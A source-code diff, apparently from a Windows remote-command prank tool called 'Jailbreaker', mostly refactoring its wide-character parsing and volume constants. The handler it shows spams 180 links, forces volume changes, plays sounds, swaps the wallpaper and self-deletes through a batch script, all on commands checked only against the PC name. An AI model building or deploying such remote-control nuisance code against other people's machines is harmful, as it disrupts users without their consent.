@@ -106,11 +106,7 @@ void popupW(char *argz) {
     MultiByteToWideChar(CP_UTF8, 0, argz, -1, wargz, CMD_ARGSZ); // turn argz to wchar and put it in wargz
 
     // we're never adding support for wchars ever again
-#ifdef __MINGW64__
-    wchar_t *dummy = NULL;
-    wchar_t *arg1 = wcstok(wargz, SEPL, &dummy);
-    wchar_t *arg2 = wcstok(NULL, SEPL, &dummy);
-#elif defined(TELTHAR_STUPID_WIDE_CHAR)
+#ifdef TELTHAR_STUPID_WIDE_CHAR
     /* For later generations */
     
     //wchar_t *arg1 = _wcstok_s_l(wargz, SEPL, &ptr, TELTHAR_STUPID_WIDE_CHAR);
@@ -130,6 +126,10 @@ void popupW(char *argz) {
 
     free(arg1); // you didnt even fucking free this shit
     free(arg2);
+#elif defined(_UCRT)
+    wchar_t *dummy = NULL;
+    wchar_t *arg1 = wcstok(wargz, SEPL, &dummy);
+    wchar_t *arg2 = wcstok(NULL, SEPL, &dummy);
 #else
     wchar_t *arg1 = wcstok(wargz, SEPL);
     wchar_t *arg2 = wcstok(NULL, SEPL);
@@ -158,7 +158,7 @@ void execCommand(JBCMD cmd)
     //hexdump("cmd.auth", cmd.auth, AUTH_LENGTH, 16);
     //hexdump("PCName", PCName, AUTH_LENGTH, 16);
     if (strcmp(cmd.auth, PCName)) {
-        JBlogErr("Auth failed.");
+        JBlogErr("Authentication failed.");
         return;
     }
 
@@ -170,14 +170,14 @@ void execCommand(JBCMD cmd)
 
     switch (cmd.cmd)
     {
-    /* --- Templates --- */
+    /* --- Main --- */
     case JB_DEACTIVE:
         JBlog("Jailbreaker deactivated.");
         exit(0);
         break;
     case JB_FUN:
         CreateLinks(180);
-        SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP);
+        SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, VOLUME_UP);
         play("stalker");
         changeWallpaper("jail");
         break;
@@ -185,16 +185,16 @@ void execCommand(JBCMD cmd)
         // you should uninstall yourself NOW!!!
         JBlog("Killing myself rn...");
         system("start /min /high kys.bat");
-        exit(0); // just in case
+        exit(0);
         break;
 
     /* --- Audio --- */
     case JB_VOLUME:
-        if(!SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP)) // literally raw system mesage
+        if(!SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, VOLUME_UP)) // literally raw system mesage
             JBlogErr("Could not change Volume");
         break;
     case JB_MUTE:
-        if(!SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_DOWN))
+        if(!SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, VOLUME_DOWN))
             JBlogErr("Could not change Volume");
 		break;
     case JB_SZAMBO: // it has to be a .wav file
